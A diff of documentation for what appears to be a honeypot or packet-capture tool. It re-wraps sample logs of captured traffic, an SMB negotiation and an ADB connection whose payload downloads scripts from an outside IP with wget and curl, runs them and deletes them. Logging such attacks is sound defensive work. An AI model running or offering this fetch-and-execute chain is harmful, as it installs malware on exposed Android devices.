@@ -63,7 +63,11 @@ SSH_PORT=YOUR_SSH_PORT
 [Recv sniffed packet: FPA] 112.119.192.XXX:49829 -> 133.18.171.YYY:5555
 [Send dummy packet: ACK] 133.18.171.YYY 5555  ->  112.119.192.XXX 49829
 ###[ Raw ]###
-  load      = 'CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x002\x02\x00\x00\xbc\xb1\xa7\xb1host::\x00OPEN\x05\x00\x00\x00\x00\x00\x00\x00\xcd\x00\x00\x00\xd5@\x00\x00\xb0\xaf\xba\xb1shell:busybox wget http://188.209.52.ZZZ/w -O -> /data/local/tmp/w; sh /data/local/tmp/w; rm /data/local/tmp/w; curl http://188.209.52.ZZZ/c > /data/local/tmp/c; sh /data/local/tmp/c; rm /data/local/tmp/c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+  load      = 'CNXN\x00\x00\x00\x01\x00\x10\x00\x00\x07\x00\x00\x002\x02\x00\x00\xbc\xb1\xa7\xb1host::
+  \x00OPEN\x05\x00\x00\x00\x00\x00\x00\x00\xcd\x00\x00\x00\xd5@\x00\x00\xb0\xaf\xba\xb1shell:busybox 
+  wget http://188.209.52.ZZZ/w -O -> /data/local/tmp/w; sh /data/local/tmp/w; rm /data/local/tmp/w; 
+  curl http://188.209.52.ZZZ/c > /data/local/tmp/c; sh /data/local/tmp/c; 
+  rm /data/local/tmp/c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
   
 [Recv sniffed packet: S] 69.90.184.XXX:38267 -> 133.18.171.YYY:445
 [Send dummy packet: SYN/ACK] 133.18.171.YYY:445 -> 69.90.184.XXX:38267
@@ -72,5 +76,7 @@ SSH_PORT=YOUR_SSH_PORT
 [Recv sniffed packet: PA] 69.90.184.XXX:38267 -> 133.18.171.YYY:445
 [Send dummy packet: ACK] 133.18.171.YYY 445  ->  69.90.184.XXX 38267
 ###[ Raw ]###
-  load      = '\x00\x00\x00\x85\xffSMBr\x00\x00\x00\x00\x18S\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x04Z\x00b\x00\x02PC NETWORK PROGRAM 1.0\x00\x02LANMAN1.0\x00\x02Windows for Workgroups 3.1a\x00\x02LM1.2X002\x00\x02LANMAN2.1\x00\x02NT LM 0.12\x00'
+  load      = '\x00\x00\x00\x85\xffSMBr\x00\x00\x00\x00\x18S\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+  \xff\xfe\x00\x00\x04Z\x00b\x00\x02PC NETWORK PROGRAM 1.0\x00\x02LANMAN1.0\x00\x02Windows for Workgroups 
+  3.1a\x00\x02LM1.2X002\x00\x02LANMAN2.1\x00\x02NT LM 0.12\x00'
 ```
